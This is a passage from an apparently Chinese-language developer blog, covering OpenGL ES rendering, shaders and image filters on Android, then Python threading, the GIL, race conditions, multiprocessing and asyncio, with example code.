bytes per float) ByteBuffer.allocateDirect(triangleCoords.size * 4).run { // use the device hardware&#39;s native byte order order(ByteOrder.nativeOrder()) // create a floating point buffer from the ByteBuffer asFloatBuffer().apply { // add the coordinates to the FloatBuffer put(triangleCoords) // set the buffer to read the first coordinate position(0) } } private var mProgram: Int private val vertexShaderCode = &quot;attribute vec4 vPosition;&quot; + &quot;void main() {&quot; + &quot; gl_Position = vPosition;&quot; + &quot;}&quot; private val fragmentShaderCode = &quot;precision mediump float;&quot; + &quot;uniform vec4 vColor;&quot; + &quot;void main() {&quot; + &quot; gl_FragColor = vColor;&quot; + &quot;}&quot; private val vertexCount: Int = triangleCoords.size / COORDS_PER_VERTEX private val vertexStride: Int = COORDS_PER_VERTEX * 4 // 4 bytes per vertex init { val vertexShader: Int = loadShader(GLES20.GL_VERTEX_SHADER, vertexShaderCode) val fragmentShader: Int = loadShader(GLES20.GL_FRAGMENT_SHADER, fragmentShaderCode) // create empty OpenGL ES Program mProgram = GLES20.glCreateProgram().also { // add the vertex shader to program GLES20.glAttachShader(it, vertexShader) // add the fragment shader to program GLES20.glAttachShader(it, fragmentShader) // creates OpenGL ES program executables GLES20.glLinkProgram(it) } } private var mPositionHandle: Int = 0 private var mColorHandle: Int = 0 fun loadShader(type: Int, shaderCode: String): Int { // create a vertex shader type (GLES20.GL_VERTEX_SHADER) // or a fragment shader type (GLES20.GL_FRAGMENT_SHADER) return GLES20.glCreateShader(type).also { shader -&gt; // add the source code to the shader and compile it GLES20.glShaderSource(shader, shaderCode) GLES20.glCompileShader(shader) } } fun draw() { // Add program to OpenGL ES environment GLES20.glUseProgram(mProgram) // get handle to vertex shader&#39;s vPosition member mPositionHandle = GLES20.glGetAttribLocation(mProgram, &quot;vPosition&quot;).also { // Enable a handle to the triangle vertices GLES20.glEnableVertexAttribArray(it) // Prepare the triangle coordinate data GLES20.glVertexAttribPointer( it, COORDS_PER_VERTEX, GLES20.GL_FLOAT, false, vertexStride, vertexBuffer ) // get handle to fragment shader&#39;s vColor member mColorHandle = GLES20.glGetUniformLocation(mProgram, &quot;vColor&quot;).also { colorHandle -&gt; // Set color for drawing the triangle GLES20.glUniform4fv(colorHandle, 1, color, 0) } // Draw the triangle GLES20.glDrawArrays(GLES20.GL_TRIANGLES, 0, vertexCount) // Disable vertex array GLES20.glDisableVertexAttribArray(it) } } } 接下来是 Apply projection and camera viewsProjection 就是根据设备的实际屏幕尺寸调节绘制坐标Camera View 就是根据一个假想的camera视角调节坐标 着色器语言GLSL写到这里，基本的流程就是在onSurfaceCreated中去loadShader，而shaderCode一般是这样的。 uniform mat4 vMatrix; varying vec4 vColor; attribute vec4 vPosition; void main(){ gl_Position=vMatrix*vPosition; if(vPosition.z!=0.0){ vColor=vec4(0.0,0.0,0.0,1.0); }else{ vColor=vec4(0.9,0.9,0.9,1.0); } } 这是一门高级的图形化编程语言，其源于应用广泛的C语言，主要特性包括: GLSL是一种面向过程的语言，和Java的面向对象是不同的。 GLSL的基本语法与C/C++基本相同。 它完美的支持向量和矩阵操作。 它是通过限定符操作来管理输入输出类型的。 GLSL提供了大量的内置函数来提供丰富的扩展功能。 顶点着色器的内建变量gl_Position：顶点坐标gl_PointSize：点的大小，没有赋值则为默认值1，通常设置绘图为点绘制才有意义。 片元着色器的内建变量输入变量gl_FragCoord：当前片元相对窗口位置所处的坐标。gl_FragFacing：bool型，表示是否为属于光栅化生成此片元的对应图元的正面。输出变量gl_FragColor：当前片元颜色gl_FragData：vec4类型的数组。向其写入的信息，供渲染管线的后继过程使用。 内置函数:纹理采样函数纹理采样函数有texture2D、texture2DProj、texture2DLod、texture2DProjLod、textureCube、textureCubeLod及texture3D、texture3DProj、texture3DLod、texture3DProjLod等。 向量在GPU中由硬件支持运算，比CPU快的多。总的来说这门语言要比其他编程语言简单些 用OpenGL ES显示图片纹理(texture):在理解纹理映射时，可以将纹理看做应用在物体表面的像素颜色。在真实世界中，纹理表示一个对象的颜色、图案以及触觉特征。纹理只表示对象表面的彩色图案，它不能改变对象的几何形式。更进一步的说，它只是一种高强度的计算行为。 比如一张矩形的图片是由两个三角形拼起来的，左下 -&gt; 左上 -&gt; 右下 -&gt; 右上 的顺序就能得到图片的纹理下面这段代码也不是很懂，照着注释看吧 @Override public void onDrawFrame(GL10 gl) { GLES20.glClear(GLES20.GL_COLOR_BUFFER_BIT|GLES20.GL_DEPTH_BUFFER_BIT); GLES20.glUseProgram(mProgram); onDrawSet(); // 在这里添加模糊，暖色调，冷色调等滤镜效果 GLES20.glUniform1i(hIsHalf,isHalf?1:0); GLES20.glUniform1f(glHUxy,uXY); GLES20.glUniformMatrix4fv(glHMatrix,1,false,mMVPMatrix,0); GLES20.glEnableVertexAttribArray(glHPosition); GLES20.glEnableVertexAttribArray(glHCoordinate); GLES20.glUniform1i(glHTexture, 0); textureId=createTexture(); GLES20.glVertexAttribPointer(glHPosition,2,GLES20.GL_FLOAT,false,0,bPos); GLES20.glVertexAttribPointer(glHCoordinate,2,GLES20.GL_FLOAT,false,0,bCoord); GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP,0,4); } public abstract void onDrawSet(); public abstract void onDrawCreatedSet(int mProgram); private int createTexture(){ int[] texture=new int[1]; if(mBitmap!=null&amp;&amp;!mBitmap.isRecycled()){ //生成纹理 GLES20.glGenTextures(1,texture,0); //生成纹理 GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,texture[0]); //设置缩小过滤为使用纹理中坐标最接近的一个像素的颜色作为需要绘制的像素颜色 GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER,GLES20.GL_NEAREST); //设置放大过滤为使用纹理中坐标最接近的若干个颜色，通过加权平均算法得到需要绘制的像素颜色 GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D,GLES20.GL_TEXTURE_MAG_FILTER,GLES20.GL_LINEAR); //设置环绕方向S，截取纹理坐标到[1/2n,1-1/2n]。将导致永远不会与border融合 GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_S,GLES20.GL_CLAMP_TO_EDGE); //设置环绕方向T，截取纹理坐标到[1/2n,1-1/2n]。将导致永远不会与border融合 GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_T,GLES20.GL_CLAMP_TO_EDGE); //根据以上指定的参数，生成一个2D纹理 GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, mBitmap, 0); return texture[0]; } return 0; } 显示图片的关键代码:GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, mBitmap, 0); 滤镜这些特效本质上是在onDrawFrame里面去调用这两个函数 GLES20.glUniform1i(hChangeType,filter.getType()); GLES20.glUniform3fv(hChangeColor,1,filter.data(),0); 所以，滤镜(filter)效果对应的片元着色器可以这样写:GLSL语言 precision mediump float; uniform sampler2D vTexture; uniform int vChangeType; uniform vec3 vChangeColor; uniform int vIsHalf; uniform float uXY; //屏幕宽高比 varying vec4 gPosition; varying vec2 aCoordinate; varying vec4 aPos; void modifyColor(vec4 color){ color.r=max(min(color.r,1.0),0.0); color.g=max(min(color.g,1.0),0.0); color.b=max(min(color.b,1.0),0.0); color.a=max(min(color.a,1.0),0.0); } void main(){ vec4 nColor=texture2D(vTexture,aCoordinate); if(aPos.x&gt;0.0||vIsHalf==0){ if(vChangeType==1){ //黑白图片 float c=nColor.r*vChangeColor.r+nColor.g*vChangeColor.g+nColor.b*vChangeColor.b; gl_FragColor=vec4(c,c,c,nColor.a); }else if(vChangeType==2){ //简单色彩处理，冷暖色调、增加亮度、降低亮度等 vec4 deltaColor=nColor+vec4(vChangeColor,0.0); modifyColor(deltaColor); gl_FragColor=deltaColor; }else if(vChangeType==3){ //模糊处理 nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.r,aCoordinate.y-vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.r,aCoordinate.y+vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.r,aCoordinate.y-vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.r,aCoordinate.y+vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.g,aCoordinate.y-vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.g,aCoordinate.y+vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.g,aCoordinate.y-vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.g,aCoordinate.y+vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.b,aCoordinate.y-vChangeColor.b)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.b,aCoordinate.y+vChangeColor.b)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.b,aCoordinate.y-vChangeColor.b)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.b,aCoordinate.y+vChangeColor.b)); nColor/=13.0; gl_FragColor=nColor; }else if(vChangeType==4){ //放大镜效果 float dis=distance(vec2(gPosition.x,gPosition.y/uXY),vec2(vChangeColor.r,vChangeColor.g)); if(dis&lt;vChangeColor.b){ nColor=texture2D(vTexture,vec2(aCoordinate.x/2.0+0.25,aCoordinate.y/2.0+0.25)); } gl_FragColor=nColor; }else{ gl_FragColor=nColor; } }else{ gl_FragColor=nColor; } 相机预览利用OpenGLES显示图片处理图片。视频每一帧其实也是一张图片，Camera预览时，每一帧自然也是一幅图片，我们可以把每张图片按照时间顺序显示出来，就完成了Camera预览的实现。当然不可能把相机每一帧的数据转成一个bitmap来操作，GLES20提供了绑定纹理贴图的函数。GLES20.java // C function void glTexImage2D ( GLenum target, GLint level, GLint internalformat, GLsizei width, GLsizei height, GLint border, GLenum format, GLenum type, const GLvoid *pixels ) public static native void glTexImage2D( int target, int level, int internalformat, int width, int height, int border, int format, int type, java.nio.Buffer pixels ); 完全就是c函数的包装虽然OpenGLES给我们提供的入口是传入Buffer，然而，它却限制了Buffer的格式为单一通道，或者是RGBA、RGB等格式，而Camera的帧数据却只能为NV21或者YV21的Android的Camera及Camera2都允许使用SurfaceTexture作为预览载体，但是它们所使用的SurfaceTexture传入的OpenGL texture object name必须为GLES11Ext.GL_TEXTURE_EXTERNAL_OES。这种方式，实际上就是两个OpenGL Thread共享一个Texture，不再需要数据导入导出，从Camera采集的数据直接在GPU中完成转换和渲染。关键函数是surfaceTexture.updateTexImage()，每当摄像头有新的数据来时，我们需要通过surfaceTexture.updateTexImage()更新预览上的图像。 图片处理冷色调、暖色调、复古、黑白这些滤镜效果其实就是把hex color的ARGB channel调整一下。 &lt;color name=&quot;bg_color&quot;&gt;#FF88269F&lt;/color&gt; 黑白图片是怎么来的？黑白图片上，每个像素点的RGB三个通道值应该是相等的。知道了这个，将彩色图片处理成黑白图片就非常简单了。我们直接获取像素点的RGB三个通道，相加然后除以3作为处理后每个通道的值就可以得到一个黑白图片了。这是均值的方式是常见黑白图片处理的一种方法。类似的还有权值方法（给予RGB三个通道不同的比例）、只取绿色通道等方式。与之类似的，冷色调的处理就是单一增加蓝色通道的值，暖色调的处理可以增加红绿通道的值。还有其他复古、浮雕等处理也都差不多。 类似的滤镜效果还有：胶片效果：就是把RGBA的A,R,G,B全部用255减掉即：A = 255 - AR = 255 -RG = 255 - GB = 255 - B 但是实际上用取反操作符(~)就可以了因为ARGB正好是4个byte(1个int)比方说1111， 取反(位非)之后变成11111110 11111110 11111110 11111110也就是255减去的效果 这个RGBA的顺序不能搞错In OpenGL and Portable Network Graphics (PNG), the RGBA (byte-order) is used, where the colors are stored in memory such that R is at the lowest address, G after it, B after that, and A last. On a little endian architecture this is equivalent to ABGR (word-order). 就是说，opengl和png数据中,byte array的顺序从内存低地址到高地址依次是RGBA，在小端上会掉头 Android 关于美颜/滤镜 从OpenGl录制视频的一种方案有这样的操作byte[]的代码，需要指出的是。java平台上，因为有jvm的存在，所以是大端。所以这下面的代码才成立 int[] pixelData = new int[width * height]; int offset = 0; int index = 0; for (int i = 0; i &lt; height; ++i) { for (int j = 0; j &lt; width; ++j) { int pixel = 0; pixel |= (data[offset] &amp; 0xff) &lt;&lt; 16; // R pixel |= (data[offset + 1] &amp; 0xff) &lt;&lt; 8; // G pixel |= (data[offset + 2] &amp; 0xff); // B pixel |= (data[offset + 3] &amp; 0xff) &lt;&lt; 24; // A pixelData[index++] = pixel; offset += pixelStride; } offset += rowPadding; } 图片模糊图片模糊处理相对上面的色调处理稍微复杂一点，通常图片模糊处理是采集周边多个点，然后利用这些点的色彩和这个点自身的色彩进行计算，得到一个新的色彩值作为目标色彩。模糊处理有很多算法，类似高斯模糊、径向模糊等等。 YUV格式解释(相机返回的是YUV格式的图像数据) RGB图像大家都了解，RGB图像分为了三个颜色分量，R红色分量，G绿色分量，B蓝色分量。而YUV图像，也是分为了三个分量，Y亮度分量，用来表示明亮度，也叫灰阶值，U分量和V分量是色值分量，用来表示图像色彩与饱和度，其中U分量也叫Cb，表示的图像蓝色偏移量，V分量也叫Cr，用来表示图像红色部分偏移量，所以YUV有时也写作YCbCr。YUV图像把亮度和色度分开了，避免了亮度和色度的相互干扰，可以在降低色度采样率的情况下，保持图像的视觉质量。```RGB转YUV: Y = 0.299 R + 0.587 G + 0.114 B U = - 0.1687 R - 0.3313 G + 0.5 B + 128 V = 0.5 R - 0.4187 G - 0.0813 B + 128 YUV转RGB: R = Y + 1.402 (V - 128) G = Y - 0.34414 (U - 128) - 0.71414 (V - 128) B = Y + 1.772 (U - 128) Camera可以通过setPreviewFormat()方法来设置预览图像的数据格式，推荐选择的有ImageFormat.NV21和ImageFormat.YV12，默认是NV21。NV21属于YUV图像. [Android Camera2 API YUV_420_888 to JPEG](https://stackoverflow.com/questions/40090681/android-camera2-api-yuv-420-888-to-jpeg) [YuvImage.compressToJpeg](https://developer.android.com/reference/android/graphics/YuvImage.html#compressToJpeg(android.graphics.Rect,%20int,%20java.io.OutputStream)) android sdk提供了将yuv转为jpg的方法 public boolean compressToJpeg (Rect rectangle, int quality, OutputStream stream)```将一个YuvImage压缩成jpeg，存到一个outputStream中。这个方法借助Android的JNI，实现了非常高效率的JPEG格式文件写入（比Bitmap.compress()效率都要高不少） 参考opengles guide on androidAndroid利用硬解硬编和OpenGLES来高效的处理MP4视频第三方实例利用 FFmpeg 在 Android 上做视频编辑2018年还在更新的硬件解码视频范例","tags":[{"name":"opengl","slug":"opengl","permalink":"https://haldir65.github.io/tags/opengl/"}]},{"title":"python中多进程、多线程以及GIL记录","date":"2018-11-11T22:21:52.000Z","path":"2018/11/11/2018-11-11-python-gil-and-what-you-can-do-about-it/","text":"If your code has a lot of I/O or Network usage:Multithreading is your best bet because of its low overhead If you have a GUIMultithreading so your UI thread doesn’t get locked up If your code is CPU bound:You should use multiprocessing (if your machine has multiple cores) Python Global Interpreter Lock(GIL)对于CPython，所有的python bytecode在执行前都需要获得interpreter的lock,one vm thread at a time。(java实现的python似乎没有这个烦恼)GIL的出现似乎是历史原因（为了方便的直接使用当时现有的c extension）。而没有在python3中被移除的原因是因为这会造成单线程的程序在python3中跑的反而比python2中慢。 因为GIL的存在，python中的线程并不能实现cpu的并发运行(同时只能有一条线程在运行)。但对于I/O intensive的任务来说，cpu都在等待I/O操作完成，所以爬虫这类操作使用多线程是合适的。根据A Jesse Jiryu Davis在pycon2017上的演讲，在多线程python程序中，如果某条线程开始进行I/O操作，就会主动放弃GIL(这是在socket module的源码中)，或者在cpu-intensive程序中，一条线程连续执行1000次(python2中是一个常数)后就会被夺走gil。socket里面找关键字Py_BEGIN_ALLOW_THREADS和Py_END_ALLOW_THREADS 这是两个macro，自己写python c entension的时候可能会用得上 多线程以及一些同步的问题单线程的版本 # single_threaded.py import time from threading import Thread COUNT = 50000000 def countdown(n): while n&gt;0: n -= 1 start = time.time() countdown(COUNT) end = time.time() print(&#39;Time taken in seconds -&#39;, end - start) 多线程的版本多线程下总会对公共资源的操作是需要考虑race condition的，并且这种问题很难通过测试测出来。 # multi_threaded.py import time from threading import Thread COUNT = 50000000 def countdown(n): while n&gt;0: n -= 1 t1 = Thread(target=countdown, args=(COUNT//2,)) t2 = Thread(target=countdown, args=(COUNT//2,)) start = time.time() t1.start() t2.start() t1.join() t2.join() end = time.time() print(&#39;Time taken in seconds -&#39;, end - start) 多线程虽然同一时刻只能有一条线程运行，但牵涉到数据共享的时候还是要加锁 比如这个例子，照说打印出来的应该是0，但实际操作中可能打出来正数 import time, threading # 假定这是你的银行存款: balance = 0 def change_it(n): # 先存后取，结果应该为0: global balance balance = balance + n balance = balance - n def run_thread(n): for i in range(1000000): change_it(n) t1 = threading.Thread(target=run_thread, args=(5,)) t2 = threading.Thread(target=run_thread, args=(8,)) t1.start() t2.start() t1.join() t2.join() print(balance) 上述过程的原因在于balance = balance + n这一步其实需要至少两条cpu语句：x = balance +nbalance = x 正常顺序是t1 (+5,-5) t2 (+8, -8) 这样的顺序不正常的顺序 初始值 balance = 0 t1: x1 = balance + 5 # x1 = 0 + 5 = 5 t2: x2 = balance + 8 # x2 = 0 + 8 = 8 t2: balance = x2 # balance = 8 t1: balance = x1 # balance = 5 t1: x1 = balance - 5 # x1 = 5 - 5 = 0 t1: balance = x1 # balance = 0 t2: x2 = balance -8 # x2 =-8 t2: balance = x2 # balance = -8 结果 balance = -8 所以是有可能打印出-8这样的错误的结果的 这种情况下只要加锁就可以了 import time, threading balance = 0 lock = threading.Lock() def change_it(n): global balance balance = balance + n balance = balance - n def run_thread(n): for i in range(1000000): lock.acquire() try: change_it(n) finally: lock.release() t1 = threading.Thread(target=run_thread, args=(5,)) t2 = threading.Thread(target=run_thread, args=(8,)) t1.start() t2.start() t1.join() t2.join() print(balance) 改成每一次对共享变量进行操作都需要加锁之后，打印结果就正常了多进程之间的同步方式包括queue,Event,Semaphores，Conditions等 从bytecode来看，increment这一操作并不是atomic的python里面很方便incremnt-is-not-atomic.py def foo(): global n n += 1 import dis dis.dis(foo) python incremnt-is-not-atomic.py 3 0 LOAD_GLOBAL 0 (n) 2 LOAD_CONST 1 (1) 4 INPLACE_ADD 6 STORE_GLOBAL 0 (n) 8 LOAD_CONST 0 (None) 10 RETURN_VALUE 多线程环境下对资源的操作需要考虑线程安全问题有些操作不是原子性的Thinking about Concurrency, Raymond Hettinger, Python core developerjava中最初的设计是有kill thread的method的，但是后来被deprecated了（假设你kill了一个获取了锁的线程，程序将进入死锁状态）。 python中理论上是可以kill一个线程的，但是kill一个线程这件事本身就是不应该的。 一个最简单的多线程资源竞争的例子 import threading counter = 0 def worker(): global counter counter += 1 print(&#39;The count is %d&#39; % counter) print(&#39;------------&#39;) print(&#39;Starting up --------&#39;) for i in range(10): threading.Thread(target=worker).start() print(&#39;Finishing up&#39;) 输出 Starting up -------- The count is 1 ------------ The count is 2 ------------ The count is 3 ------------ The count is 4 ------------ The count is 5 ------------ The count is 6 ------------ The count is 7 ------------ The count is 8 ------------ The count is 9 ------------ The count is 10 ------------ Finishing up 数据量比较小的时候不容易发现这里存在的race condition。如果在每一次对资源进行操作之间都插入一段thread.sleep，问题就出来了 import threading,time, random FUZZ = True def fuzz(): if FUZZ: time.sleep(random.random()) counter = 0 def worker(): global counter fuzz() oldcnt = counter fuzz() counter = oldcnt +1 fuzz() print(&#39;The count is %d&#39; % counter) fuzz() print(&#39;------------&#39;) fuzz() print(&#39;Starting up --------\\n&#39;) fuzz() for i in range(10): t = threading.Thread(target=worker) t.start() fuzz() print(&#39;Finishing up&#39;) fuzz() 资源竞争场景下，问题就出来了 Starting up -------- The count is 1 ------------ The count is 2 The count is 3 ------------ ------------ The count is 5 The count is 5 ------------ ------------ The count is 5 ------------ Finishing up The count is 7 The count is 8 ------------ ------------ The count is 8 ------------ The count is 8 ------------ 多线程之间的同步问题，一种是加锁，另一种是使用atomic message queue.python中有些module内部已经加了锁，logging,decimal(thread local),databases(reader locks and writer locks),email(atomic message queue)。锁在写operating system的时候非常有用，但是其他时候不要用。所有的资源都应该只能同时被一条线程操作。threading中的join就属于一种barrier（主线程调用t.join，就是等t跑完了之后，主线程再去干接下来的事情） Raymond Hettinger提到message queue的task_done方法是他created的。(还是atomic measge queue, 好像是内部加了锁，操作queue中资源的只有那么一条线程，当然不存在并发问题). 其实raymod也提到了，你也可以用RabbitMQ等,ZEROMQ 甚至是database（内部有read write lock） def worker(): while True: item = q.get() do_work(item) q.task_done() q = Queue() for i in range(num_worker_threads): t = Thread(target=worker) t.daemon = True t.start() for item in source(): q.put(item) q.join() # block until all tasks are done 爬虫简单的多线程版本是每个线程创建的时候，就给出一个args = [someurl] ，然后有多少任务就创建多少线程。但是这样做迟早会碰上操作系统对最大线程数的设置[据说400+]，于是又想到用threadPool,自己实现threadpool的也是大有人在（内部持有一个任务队列，不停去队列里获取任务）。(https://www.shanelynn.ie/using-python-threading-for-multiple-results-queue/) error: can&#39;t start new thread File &quot;/usr/lib/python2.5/threading.py&quot;, line 440, in start _start_new_thread(self.__bootstrap, ()) 那么比较实用的使用场景是，spawn 10条线程去进行while not queue.empty() -&gt; requests.get()操作，各自在完成之后丢到一个通用的容器中，再由message queue独立完成所有response的processing.到这里还只是停留在多线程的阶段。 多进程人们很容易想到多进程的版本，可以不用顾虑GIL的存在 from multiprocessing import Pool import time COUNT = 50000000 def countdown(n): while n&gt;0: n -= 1 if __name__ == &#39;__main__&#39;: pool = Pool(processes=2) start = time.time() r1 = pool.apply_async(countdown, [COUNT//2]) r2 = pool.apply_async(countdown, [COUNT//2]) pool.close() pool.join() end = time.time() print(&#39;Time taken in seconds -&#39;, end - start) 多进程之间内存不共享，同步方式是使用Queue(fifo) #!/usr/bin/env python3 import multiprocessing import time import random import os from multiprocessing import Queue q = Queue() def hello(n): time.sleep(random.randint(1,3)) q.put(os.getpid()) print(&quot;[{0}] Hello!&quot;.format(n)) processes = [ ] for i in range(10): t = multiprocessing.Process(target=hello, args=(i,)) processes.append(t) t.start() for one_process in processes: one_process.join() mylist = [ ] while not q.empty(): mylist.append(q.get()) print(&quot;Done!&quot;) print(len(mylist)) print(mylist) 更加Pythonic的方式是使用asyncio Asyncio优点包括 Based on futures Faster than threads Massive I/O concurrency async def fetch_url(url): return await aiohttp.request(&#39;GET&#39; , url) ## you get the future, the function is not executed immediatedly async def fetch_two(url_a,url_b): future_a = fetch_url(url_a) future_b = fetch_url(url_b) a ,b = await asyncio.gather(future_a, future_b) ## 一旦开始await这个future,这个coroutine才会被加入event loop return a, b 上述代码虽然还是在同一个进程中运行，还受到GIL制约，但是由于是I/O操作，所以也没什么问题。只是在process返回的结果是，就会受到GIL的影响了。（实际操作中你会发现coroutine还没执行就timeout了） @asyncio.coroutine这个decorator是3.4出现的，3.5之后直接使用async await关键字。这个decorator也就过时了 import asyncio import time async def speak_async(): print(&#39;starting====&#39;) r = await asyncio.sleep(1) ##这里不能使用time.sleep(1) print(&#39;OMG asynchronicity!&#39;) loop = asyncio.get_event_loop() loop.run_until_complete(speak_async()) loop.close() 对于阻塞式的io调用，不是说加一个await函数就能实现异步了To use requests (or any other blocking libraries) with asyncio, you can use BaseEventLoop.run_in_executor to run a function in another thread and yield from it to get the result.asyncio毕竟只有一条线程，所以request这种阻塞式的函数不能直接拿来用，需要run_in_executor或者用线程池、进程包装一下 import time import requests import asyncio async def getUrlBlocking(url): print(&quot;starting request to %s &quot; % url) loop = asyncio.get_event_loop() response = await loop.run_in_executor(None, requests.get, url) print(response.status_code) return response async def gotResponse(url): res = await getUrlBlocking(url) print(res.text) return res if __name__ == &quot;__main__&quot;: s = time.perf_counter() loop = asyncio.get_event_loop() tasks = [gotResponse(&quot;https://jsonplaceholder.typicode.com/posts/%s&quot; % i) for i in range(100)] loop.run_until_complete(asyncio.wait(tasks)) loop.close() elapsed = time.perf_counter() - s print(f&quot;{__file__} executed in {elapsed:0.2f} seconds.&quot;) async await要求await的东西是awaitable的 asyncio中创建任务的语法有好几种import asyncio async def doit(i): print(&quot;Start %d&quot; % i) await asyncio.sleep(3) print(&quot;End %d&quot; % i) return i if __name__ == &#39;__main__&#39;: loop = asyncio.get_event_loop() #futures = [asyncio.ensure_future(doit(i), loop=loop) for i in range(10)] #futures = [loop.create_task(doit(i)) for i in range(10)] futures = [doit(i) for i in range(10)] result = loop.run_until_complete(asyncio.gather(*futures)) print(result) 以上这三种创造出来的task全部都是无序执行的。不过python3.7以后官方更推荐使用asyncio.create_task (3.7+添加的)而不是ensure_future(3.7之前)去创建任务。 所以一般的将async tasks添加到event loop的套路是这样的。main函数是async 的，3.5-3.6麻烦一点，3.7最简单python3.5-3.6 loop = asyncio.get_event_loop() try: loop.run_until_complete(main()) finally: loop.close() python 3.7 asyncio.run(main()) # Python 3.7+ Generator functions are, as it so happens, the foundation of async IO (regardless of whether you declare coroutines with async def rather than the older @asyncio.coroutine wrapper). Technically, await is more closely analogous to yield from than it is to yield. (But remember that yield from x() is just syntactic sugar to replace for i in x(): yield i.) generator函数(无论是用asyc def创建的还是用@asyncio.coroutine的docorator)是asyncio的基础。从技术层面来讲,await ≈≈ yield from (但是记住yield from x() 只是一个语法糖而已) Mulitiprocessing is good , asyncio is great, Why not both也就是说，I/O操作用asyncio，数据处理使用multi-processing，这几乎是完美的解决方案了正常情况下，一个async event是跑在一条线程，一个cpu core上就足够了。John Reese - Thinking Outside the GIL with AsyncIO and Multiprocessing - PyCon 2018 这里讲述了如何在多个core之间跑一个event loop由于coroutine和multi-processing是两个相对独立的模块，所以需要自己把两者结合起来。用多进程进行数据处理，每个进程中各自有独立的coroutine在运行。 async def run_loop(tx, rx): ... ## real work here limit = 10 pending = set() while True: while len(pending) &lt; limit: task = tx.get_nowait() fn ,args, kwargs = task pending.add(fn(args,kwargs)) done, pending = await asyncio.wait(pending, ..) for future in done: rx.put_nowait(await future) def bootstrap(tx, rx): loop = asyncio.new_event_loop() asyncio.set_event_loop(loop) loop.run_untile_complete(run_loop(tx, rx)) def main(): p = multiprocessing.Process(target = bootstrap, args = (tx, rx)) p.start() 实际操作可能看起来像这样 async def fetch_url(url): return await aiohttp.request(&#39;GET&#39; , url) def fetch_all(urls): tx, rx = Queue(), Queue() Process( target=bootstrap, args=(tx,rx) ).start() for url in urls: task = fetch_url,(url,), {} tx.put_nowait(task) 已经开源aioprocessing pip install aiomultiprocess 关于协程coroutine是一个在很多编程语言中都有的概念，在python中coroutine一般指的是generator based coroutines。首先，因为协程是一种能暂停的函数，那么它暂停是为了什么？一般是等待某个事件，比如说某个连接建立了；某个 socket 接收到数据了；某个计时器归零了等。而这些事件应用程序只能通过轮询的方式得知是否完成，但是操作系统（所有现代的操作系统）可以提供一些中断的方式通知应用程序，如 select, epoll, kqueue 等等。understand-python-asyncio 基础是generator(任何包含yield expression的函数) $ &gt;&gt;&gt;def gen_fn(): print(&#39;start&#39;) yiled 1 print(&#39;middle&#39;) yield 2 print(&#39;done&#39;) $ &gt;&gt;&gt; gen = gen_fn() $ &gt;&gt;&gt; gen $ &lt;generator object gen_fn at 0x7f83cddc0b48&gt; &gt;&gt;&gt; gen.gi_code.co_code //对应的bytecode b&#39;t\\x00d\\x01\\x83\\x01\\x01\\x00d\\x02V\\x00\\x01\\x00t\\x00d\\x03\\x83\\x01\\x01\\x00d\\x04V\\x00\\x01\\x00t\\x00d\\x05\\x83\\x01\\x01\\x00d\\x00S\\x00&#39; &gt;&gt;&gt; len(gen.gi_code.co_code) 40 &gt;&gt;&gt; gen.gi_frame.f_lasti //instruction pointer , 说明当前执行到哪个指令了，-1说明还没有开始执行 -1 &gt;&gt;&gt; next(gen) start 1 &gt;&gt;&gt; ret = next(gen) middle &gt;&gt;&gt; ret 2 // next方法返回的是yield里面的值 &gt;&gt;&gt; next(gen) done Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; StopIteration // 这是正常的，说明generator执行完毕 &gt;&gt;&gt; import dis &gt;&gt;&gt; dis.dis(gen) 2 0 LOAD_GLOBAL 0 (print) 2 LOAD_CONST 1 (&#39;start&#39;) 4 CALL_FUNCTION 1 6 POP_TOP 3 8 LOAD_CONST 2 (1) 10 YIELD_VALUE 12 POP_TOP 4 14 LOAD_GLOBAL 0 (print) 16 LOAD_CONST 3 (&#39;middle&#39;) 18 CALL_FUNCTION 1 20 POP_TOP 5 22 LOAD_CONST 4 (2) 24 YIELD_VALUE 26 POP_TOP 6 28 LOAD_GLOBAL 0 (print) 30 LOAD_CONST 5 (&#39;done&#39;) 32 CALL_FUNCTION 1 34 POP_TOP 36 LOAD_CONST 0 (None) 38 RETURN_VALUE &gt;&gt;&gt; python3.3中开始出现yield关键字，python3.4中开始引入asyncio标准库，python 3.5标准库中出现的async await关键字只是基于generator的sytatic sugar，那么generator是如何实现的. The yield instruction takes the current executing context as a closure, and transforms it into an own living object. This object has a iter method which will continue after this yield statement.So the call stack gets transformed into a heap object. 解释generator实现原理的文章 python 2.5开始，generator能够返回数据，这之前还只是iteratble的 还可以通过gen.send函数往generator传参数event-loop的实现原理简述 python中event loop是plugable的，也就是说完全可以提供自己开发的版本。所以就有了uvloop这种跑分特别高的。asyncio包默认只提供了两种eventLoop的实现，分别是class asyncio.SelectorEventLoop(unix和windows上)class asyncio.ProactorEventLoop(windows上)查看windows_events.py中，默认的asyncio.get_event_loop()获得的就是SelectorEventLoop 基于asyncio的有名的库包括aiohttp和aiofile。二者都是对i/o进行操作 。更多的还有aio-redis, aio-lrucache…. 牵涉到一些celery的点celery能够利用好多进程todo 参考多进程还可以牵涉到进程池的概念What is the Python Global Interpreter Lock 